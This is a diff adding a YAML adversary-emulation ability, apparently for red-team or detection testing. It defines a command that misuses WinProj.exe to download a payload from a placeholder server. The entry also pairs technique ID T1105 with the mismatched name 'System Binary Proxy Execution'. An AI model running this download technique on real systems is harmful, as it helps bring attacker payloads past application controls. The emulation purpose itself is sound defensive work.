@@ -1,0 +1,21 @@
+- id: e437e216-dde9-99e6-dcec-09bd9e3b6ddb
+  name: WinProj.exe - Downloads payload from remote server
+  description: Downloads payload from remote server
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: 'WinProj.exe #{server}/file/download'
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - command-and-control
+  version: '1.0'
+  author: Avihay Eldad
+  created: '2024-02-14'
+  modified: '2024-02-14'
+  operating_system: Windows All Versions
